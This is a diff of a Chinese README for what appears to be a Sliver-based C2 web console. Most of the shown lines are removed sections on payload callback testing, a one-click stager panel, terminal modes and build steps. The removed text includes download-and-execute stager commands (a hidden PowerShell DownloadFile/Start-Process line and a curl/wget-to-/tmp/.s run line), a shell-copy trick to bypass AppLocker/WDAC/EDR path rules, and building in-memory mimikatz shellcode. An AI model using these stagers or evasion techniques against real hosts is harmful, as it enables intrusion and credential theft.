@@ -85,21 +85,6 @@ Release 里每个平台提供两个包：
 | `*-plain.zip` | 未加壳。**推荐。** |
 | `*-upx.zip` | 用 [UPX](https://upx.github.io/) 加壳。 |
 
-**关于 `-upx` 包的实测结论（与预期相反）：**
-
-启动器内嵌的服务端载荷约 217 MB，**已经是 gzip 压缩过的**，UPX 和 zip 都
-压不动它。UPX 只能压到那一小段 Go 代码，而 zip 本来也会压那段。实测：
-
-```
-plain zip : 239,209,636 字节
-upx   zip : 239,227,416 字节   ← 反而大 18 KB
-```
-
-即每平台多花约 194 秒打包时间，换来一个**略大**的包，外加一层杀软特征
-（加壳本身常被启发式判为可疑），且每次启动都要在内存里自解压。
-
-所以 **`-upx` 分支不推荐使用**，保留它只为兼容和验证。
-
 
 
 ## 仓库结构
@@ -224,9 +209,6 @@ build\build-mimikatz-shellcode.ps1 -DonutPath .\tools\donut\donut.exe
 
 **会话详情 → 权限维持** 标签页：
 
-> ⚠️ **清单是手动触发的。** 打开页面**不会**在目标上执行任何命令。
-
-原因：清单是探测式的，一次完整扫描会在目标上串行启动约 18 个进程（`reg` / `dir` / `schtasks` / `sc`），全部会进入进程创建审计与 EDR 遥测。所以扫描由点 **「重新扫描」** 触发，而不是打开页面就自动跑。
 
 模块目录是静态的，打开就能看到，可以直接安装；只有「是否已安装」这一列需要扫描。
 
@@ -286,18 +268,6 @@ ssh -L 8080:127.0.0.1:8080 user@host
 
 注意：绑 `0.0.0.0` 且已配证书时 `requireTLS` 不做任何事，本来就已经是加密的。
 
-### 跨站请求伪造（CSRF）
-
-控制台的所有写操作都要求：
-
-1. `Content-Type: application/json` —— 跨站的表单和「简单请求」设置不了这个类型，也就拿不到预检
-2. `Origin` 如果存在，必须与本机 `Host` 一致
-
-命令行工具（curl、README 里的 PowerShell 片段、Go 测试）不发 `Origin`，因此**不受影响**。
-
-### 终端 WebSocket
-
-终端握手校验 `Origin`，跨站来源直接拒绝升级。终端是目标主机上的一个交互式 shell，这是跨站 WebSocket 劫持最想要的入口。
 
 ---
 
@@ -315,132 +285,7 @@ ssh -L 8080:127.0.0.1:8080 user@host
 | darwin / freebsd 载荷未运行 | 无对应主机 |
 | windows/386 shellcode 未验证 | 需 32 位宿主；见下 |
 
-### 验证到什么程度
 
-本仓库的测试分两层，二者的结论不能互相代替：
-
-| 层次 | 覆盖 | 说明了什么 |
-|---|---|---|
-| 路由扫描 | 183/183 条 API | 接线、鉴权、参数校验、错误码正确，无崩溃 |
-| 载荷回连 | 真实生成并执行 | 载荷能建立会话 |
-
-**已实测回连**：`windows/amd64` 的 exe 与 shellcode（mtls / http / https），
-`windows/386` exe，混淆与免杀开关，beacon，`linux/amd64` exe（WSL 内）。
-
-**未验证**：
-
-- **DNS 与 WireGuard 监听器**：两者都需要高于当前测试会话的权限（DNS 需要接管
-  域名解析，WireGuard 需要访问仅管理员可读的设备管道），因此仅验证了监听器
-  创建成功，**未验证端到端回连**。
-- **`windows/386` shellcode**：64 位进程不能执行 32 位代码，因此需要一个 32 位
-  宿主才能验证。这不是「测出来坏了」，而是**没法在这里测**。
-- **darwin / freebsd 载荷**：没有对应主机，仅验证了能构建。
-
-`build/shellcode_loader/` 提供两个用来做上述验证的小工具（含使用注意）。
-### 一键上线
-
-监听器页有「一键上线」面板：**选一个监听器，直接拿到一条能建立会话的命令。**
-
-Windows 与 Linux 各一套模板，另有 certutil / BITS / Python 等备选，**同一个下载
-地址**，可随时换一种复制。
-
-**关键设计**：C2 地址、下载地址、端口**全部从你已建的监听器推导**，不让你填。
-这三者手工保持一致正是出问题的地方 —— 命令抓一个没人服务的路径、或载荷回连到
-没人监听的地址，都会「构建成功、下载成功、然后永远不上线」，而控制台不会有任何
-提示。
-
-实测（真实会话）：
-
-    Windows: powershell -nop -w hidden -c "...DownloadFile(...);Start-Process $o"
-             → ✅ 会话上线
-    Linux:   (curl -fsSL URL -o /tmp/.s || wget -qO /tmp/.s URL) && chmod +x /tmp/.s && /tmp/.s
-             → ✅ 会话上线
-
-只有 HTTP 家族的监听器能托管载荷（mTLS / DNS / WireGuard 无法用命令行抓取），
-所以面板只列出可用的那些。
-### Windows 终端的实现与限制
-
-Windows 上的「终端」**不是 PTY**，而是把 `cmd.exe` / `powershell.exe` 当
-**无控制台子进程**跑，交换匿名管道。这不是缺陷，是 Sliver 的设计取舍，但它
-决定了一类行为：
-
-| 现象 | 原因 |
-|---|---|
-| `vim` / `top` 按 80×24 渲染，宽终端里错位 | 无 PTY，尺寸无法传达（Windows 上没有可 resize 的对象） |
-| Ctrl+C 不产生中断 | 无控制台进程组可送信号 |
-| 程序关掉颜色/进度条 | 检测到 stdout 不是终端 |
-| PowerShell 可能不出提示符 | 无控制台 + 管道环境下 `[Console]` API 行为与交互式不同 |
-
-**终端页有三种模式**，按「对目标做的假设」从多到少排列：
-
-| 模式 | 做法 | 交互性 | 兼容性 |
-|---|---|---|---|
-| **Shell**（默认） | 真 shell 走 tunnel | 好（有提示符、内置命令、管道） | 差 —— 需要目标上有可用 shell |
-| **Shell 副本** | 先把 shell 二进制复制到可写临时目录，再从那里运行 | 同 Shell | 中 —— 解决**按路径**的策略限制（AppLocker/WDAC/EDR 允许从 temp 执行但禁止 System32）和只读系统盘 |
-| **兼容模式** | **完全不用 shell**，每行拆成「程序 + 参数」直接调 Execute | 差 —— 无提示符、无管道/重定向/通配符/内置命令 | **最好** —— 精简容器里即使没有 `/bin/sh` 也能用 |
-
-后两种**完全在控制台侧实现**，不改植入端 —— 所以对**已在运行的会话立即生效**，
-不需要重新生成载荷。
-
-兼容模式的取舍写在界面里：管道的构造（`|`、`>`、`&&`、`;`、通配符）会被
-**明确拒绝并说明**，而不是当成普通参数传给程序 —— 静默把 `ls | grep x` 当成
-`ls` 的三个参数会得到让人费解的结果。
-**终端页可以切换 shell**（默认 / `cmd` / `powershell` / `pwsh` / `sh` / `bash`，
-或填绝对路径）。这是排查这类问题最直接的对照实验：默认 shell 不出提示符时，
-换成 `cmd` 就能确认是不是 PowerShell 的问题。未列出的名字会被拒绝；绝对路径
-放行（便携 PowerShell、SysWOW64、加固镜像都属真实场景）。
-
-**shell 启动失败现在会报错。** 植入端本来就回传了 `Response.Err`，但控制台把它
-丢弃了 —— 症状是一个永远不出现内容、也不报错的黑色终端，与「靶机只是没输出」
-无法区分。现在原因会直接显示在终端里。
-### 构建服务端需要先获取资产
-
-`sliver/server/assets/fs/` 下的 `*.zip` 与各平台工具链目录**未入库**（上游 gitignore，合计约 626 MB）。
-
-在**已有资产的树**上构建没问题；从全新克隆构建需要先让 Sliver 下载一次资产：
-
-```bash
-# 首次运行会把资产解压到 ~/.sliver
-./sliver-server
-# 之后重新构建
-```
-
----
-
-## 开发
-
-```bash
-# Go 侧
-go build ./...
-go vet ./internal/ui/sliver/ ./internal/ui/api/
-go test ./internal/ui/sliver/ ./internal/ui/api/ ./internal/config/
-
-# 前端
-cd frontend
-npx tsc --noEmit -p tsconfig.json
-npx vitest run
-```
-
-### 生成 mimikatz shellcode（可选）
-
-想让内嵌 mimikatz 走内存加载（不写目标磁盘）就需要这一步：
-
-```powershell
-# 需要 donut，先放到 tools\donut\ 或 -DonutPath 指定
-build\build-mimikatz-shellcode.ps1
-```
-
-产物 `internal/embed/mimikatz/mimikatz.x64.bin` 不入库。没生成时构建照常，只是内嵌 mimikatz 的内存加载会提示改用上传执行。
-
-### 修改 protobuf 后
-
-```bash
-# 需要 protoc + protoc-gen-go + protoc-gen-go-grpc
-cd sliver
-make pb
-```
-
----
 
 ## 许可
 
